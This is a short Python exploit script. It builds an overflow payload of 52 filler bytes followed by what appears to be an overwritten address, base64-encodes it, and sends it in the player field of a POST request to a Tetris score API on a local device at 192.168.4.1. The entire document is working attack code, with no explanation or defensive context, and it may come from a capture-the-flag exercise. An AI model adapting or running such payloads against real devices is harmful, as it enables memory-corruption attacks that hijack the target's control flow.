import base64
import requests
import sys

payload = b"A" * 52 + bytes([0x5C, 0x8B, 0x00, 0x42])

print(
    requests.post(
        "http://192.168.4.1/api/v1/tetrisresult",
        json={
            "player_b64": base64.b64encode(payload).decode(),
            "points": 10,
        },
    ).content
)
